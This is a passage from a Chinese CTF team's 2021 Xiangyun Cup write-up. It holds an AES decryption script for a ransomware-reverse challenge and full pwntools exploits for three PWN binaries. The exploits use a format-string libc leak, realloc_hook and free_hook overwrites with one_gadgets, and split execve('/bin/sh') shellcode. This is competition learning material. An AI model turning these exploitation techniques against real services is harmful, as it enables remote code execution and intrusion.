<h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><p>用生成文件的修改时间为时间戳。</p>
<p><img src="https://i.loli.net/2021/08/23/2npwktZRCoTylqj.png"></p>
<p>查阅官方文档发现，0x800c是sha256，加密方式为0x660E,此为iv为零向量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad,pad</span><br><span class="line">key=<span class="built_in">bytearray</span>([   <span class="number">0xB2</span>, <span class="number">0x2F</span>, <span class="number">0xC6</span>, <span class="number">0x0E</span>, <span class="number">0x4F</span>, <span class="number">0xD4</span>, <span class="number">0x54</span>, <span class="number">0x4B</span>, <span class="number">0x05</span>, <span class="number">0x11</span>,</span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x61</span>, <span class="number">0x21</span>, <span class="number">0xE7</span>, <span class="number">0xB1</span>, <span class="number">0x8E</span>])</span><br><span class="line">key=hashlib.sha256(key).hexdigest()</span><br><span class="line">key=<span class="built_in">bytes</span>.fromhex(key)[:<span class="number">16</span>]</span><br><span class="line">iv=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">f1=<span class="built_in">open</span>(<span class="string">&quot;flag.bmp.ctf_crypter&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">f2=<span class="built_in">open</span>(<span class="string">&quot;flag.bmp&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">data=f1.read()</span><br><span class="line">ae=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">f2.write(ae.decrypt(pad(data,<span class="number">16</span>)))</span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/23/O1tNRpmY9PWSarh.png"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>队友真强，完全被带飞，做了俩pwn，还有俩pwn卡到一个点上，摸啦|<br>pwn👴👴带我飞，才发现我好菜</p>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><strong>思路：自己构建格式化字符串漏洞，这里泄露打IO_STDOUT，然后再打realloc_hook为onegadget，需要抬栈，卡在抬栈这个地方啦，然后直接rce</strong><br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/roo/桌面/glibc-all-in-one-master/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#p = remote(&quot;47.104.70.90&quot;,25315)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">	<span class="comment">#heap_addr = int(p.recv(6).ljust(8,&quot;\x00&quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">	content = p.recv()</span><br><span class="line">	</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;$rebase 0x1235&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)	</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%7$s\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) -<span class="number">0x3c36e0</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">rce =<span class="number">0x4527a</span> + libc_base</span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;realloc&quot;</span>] </span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%7$s\x00\x00\x00\x00&quot;</span>+p64(realloc_hook)</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">raw_input()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = p64(rce) + p64(realloc+<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="JigSaw’sCage"><a href="#JigSaw’sCage" class="headerlink" title="JigSaw’sCage"></a>JigSaw’sCage</h2><p>额哈，前面有长整型溢出，这个题是写shellcode的一道题，test有执行权限，难点就是只能写入0x10大小的内容，shellcode不可能只有0x10，难点考验shellcode，分chunk写入，然后再test一下即可<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./JigSAW&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;iNput:&quot;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">s1 = asm(<span class="string">&quot;mov rsp, rdx\nadd rsp, 0x20\npush rsp&quot;</span>)</span><br><span class="line">s2 = asm(<span class="string">&quot;mov rax, 0x68732f6e69622f\nadd rsp, 0x20\npush rsp&quot;</span>)</span><br><span class="line">s3 = asm(<span class="string">&quot;push rax\nmov rdi, rsp\nxor rsi, rsi\nadd rsp, 0x28\npush rsp&quot;</span>)</span><br><span class="line">s4 = asm(<span class="string">&quot;xor rdx, rdx\nmov rax, 59\nsyscall\n&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name:&quot;</span>, <span class="string">&quot;max&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">0xffffffff</span>+<span class="number">1</span>))  <span class="comment">#int len overlap</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,s1)</span><br><span class="line">edit(<span class="number">1</span>, s2)</span><br><span class="line">edit(<span class="number">2</span>, s3)</span><br><span class="line">edit(<span class="number">3</span>, s4)</span><br><span class="line">test(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion</h2><p>额哈，这道题，卡在了加密这东西的地方，后来发现可以泄露固定值，然后再进行异或就可以得到明文，想要写入明文，二次异或即可，有off-by-one，可以造overlap，直接打freehook为onegdaget即可，（这道题是赛后出来的）<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./pwdFree&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;47.104.71.220&#x27;,38562)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Save:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Pwd:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Pwd:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">   sleep(<span class="number">0.5</span>)</span><br><span class="line">   sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Check:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Delete:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Save ID:&#x27;</span>)</span><br><span class="line">random = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;cookie=&#x27;</span>,<span class="built_in">hex</span>(random)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>):</span><br><span class="line">   add(i,<span class="number">0xF0</span>,<span class="string">&#x27;aaaa&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>):</span><br><span class="line">   delete(i)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span> + p64((<span class="number">0x100</span> + <span class="number">0x90</span> + <span class="number">0x90</span>) ^ random) + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>):</span><br><span class="line">   add(i,<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">libc_base = (u64(sh.recv(<span class="number">8</span>)) ^ random) - <span class="number">0x3ebca0</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line">onegdaget=<span class="number">0x4f432</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span> ^ random) + p64(<span class="number">0x91</span> ^ random) + p64(free_hook_addr ^ random)))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>) + <span class="string">&#x27;c&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x80</span>,p64(onegdaget ^ random) + <span class="string">&#x27;d&#x27;</span>*<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>总结：队友带我飞，lemmon那道题也不难，是SROP ，doublfree 劫持tc。修改fd指向unsortedbin切割下来的chunk，可以劫持freehook为setcontet，然后srop，出来flag，我没做，思路是这</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2021第二届祥云杯WP</p><p><a href="https://wp.n03tack.top/posts/62454/">https://wp.n03tack.top/posts/62454/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><a href="https://wp.n03tack.top"><p>n03tAck</p></a></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-08-23</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-08-24</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># 相关文章</span><br><span>  1.<a class="is-size-6" href="/posts/4906/" target="_blank">2021安询杯wp</a><br></span><span>  2.<a class="is-size-6" href="/posts/14620/" target="_blank">2021陇原战疫WP</a><br></span><span>  3.<a class="is-size-6" href="/posts/5066/" target="_blank">2021bytectf线上WP</a><br></span><span>  4.<a class="is-size-6" href="/posts/47585/" target="_blank">2021绿城杯wp</a><br></span><span>  5.<a class="is-size-6" href="/posts/11556/" target="_blank">2021第一届长城杯网络安全大赛WP</a><br></span><span>  6.<a class="is-size-6" href="/posts/56002/" target="_blank">2021第五空间大赛WP</a><br></span><span>  7.<a class="is-size-6" href="/posts/1010/" target="_blank">2021网刃杯WP</a><br></span><span>  8.<a class="is-size-6" href="/posts/53053/" target="_blank">2021SSTF-Hacker&#039;s Playground!</a><br></span></div></div><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/css/share.min.css"><div class="social-share"></div><script src="https://cdnjs.loli.net/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/7D1F151CCE01A9E6F955D3AD0195257F.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/5528B1622BD2CEB3A2EF095643DE9949.jpg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/1010/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2021网刃杯WP</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/53053/"><span class="level-item">2021SSTF-Hacker&#039;s Playground!</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="is-flex is-mobile" href="#Web"><span>Web</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#ezyii"><span>ezyii</span></a></li><li><a class="is-flex is-mobile" href="#安全检测"><span>安全检测</span></a></li><li><a class="is-flex is-mobile" href="#crawler-z"><span>crawler_z</span></a></li><li><a class="is-flex is-mobile" href="#PackageManager2021"><span>PackageManager2021</span></a></li><li><a class="is-flex is-mobile" href="#层层穿透"><span>层层穿透</span></a></li><li><a class="is-flex is-mobile" href="#Secrets-Of-Admin"><span>Secrets_Of_Admin</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#MISC"><span>MISC</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#层层取证"><span>层层取证</span></a></li><li><a class="is-flex is-mobile" href="#鸣雏恋"><span>鸣雏恋</span></a></li><li><a class="is-flex is-mobile" href="#考古"><span>考古</span></a></li><li><a class="is-flex is-mobile" href="#ChieftainsSecret"><span>ChieftainsSecret</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Crypto"><span>Crypto</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#myrsa"><span>myrsa</span></a></li><li><a class="is-flex is-mobile" href="#guess"><span>guess</span></a></li><li><a class="is-flex is-mobile" href="#random-rsa"><span>random rsa</span></a></li><li><a class="is-flex is-mobile" href="#share-secret"><span>share secret</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#Reverse"><span>Reverse</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#Rev-Dizzy"><span>Rev_Dizzy</span></a></li><li><a class="is-flex is-mobile" href="#勒索病毒"><span>勒索病毒</span></a></li></ul></li><li><a class="is-flex is-mobile" href="#PWN"><span>PWN</span></a><ul class="menu-list"><li><a class="is-flex is-mobile" href="#note"><span>note</span></a></li><li><a class="is-flex is-mobile" href="#JigSaw’sCage"><span>JigSaw’sCage</span></a></li><li><a class="is-flex is-mobile" href="#PassWordBox-FreeVersion"><span>PassWordBox_FreeVersion</span></a></li></ul></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://n03tack-wp-1302856486.file.myqcloud.com/%E5%85%B6%E4%BB%96/logo.png" alt="n03tAck"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">n03tAck</p><p class="is-size-6 is-block">n03tAck战队writeup</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">1</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/dota-st" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="/admin@wlhhlc.top"><i class="fa fa-envelope"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.wlhhlc.top/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">dota_st</span></span><span class="level-right"><span class="level-item tag">www.wlhhlc.top</span></span></a></li></ul></div></div></div><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-28T07:11:45.000Z">2021-11-28</time></p><p class="title"><a href="/posts/4906/">2021安询杯wp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-11-08T01:41:17.000Z">2021-11-08</time></p><p class="title"><a href="/posts/14620/">2021陇原战疫WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-10-19T14:11:59.000Z">2021-10-19</time></p><p class="title"><a href="/posts/5066/">2021bytectf线上WP</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-30T04:23:00.000Z">2021-09-30</time></p><p class="title"><a href="/posts/47585/">2021绿城杯wp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-09-19T15:05:06.000Z">2021-09-19</time></p><p class="title"><a href="/posts/11556/">2021第一届长城杯网络安全大赛WP</a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/WP/"><span class="tag">WP</span><span class="tag is-grey-lightest">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><!--!--><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a><p class="size-small"><span>&copy; 2021 n03tAck</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© 版权说明：[本网站所有内容创作权归属n03tAck战队所有]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
            var n = new Date(time);
            now.setTime(now.getTime() + 250),
                days = (now - n) / 1e3 / 60 / 60 / 24,
                dnum = Math.floor(days),
                hours = (now - n) / 1e3 / 60 / 60 - 24 * dnum,
                hnum = Math.floor(hours),
            1 == String(hnum).length && (hnum = "0" + hnum),
                minutes = (now - n) / 1e3 / 60 - 1440 * dnum - 60 * hnum,
                mnum = Math.floor(minutes),
            1 == String(mnum).length && (mnum = "0" + mnum),
                seconds = (now - n) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,
                snum = Math.round(seconds),
            1 == String(snum).length && (snum = "0" + snum),
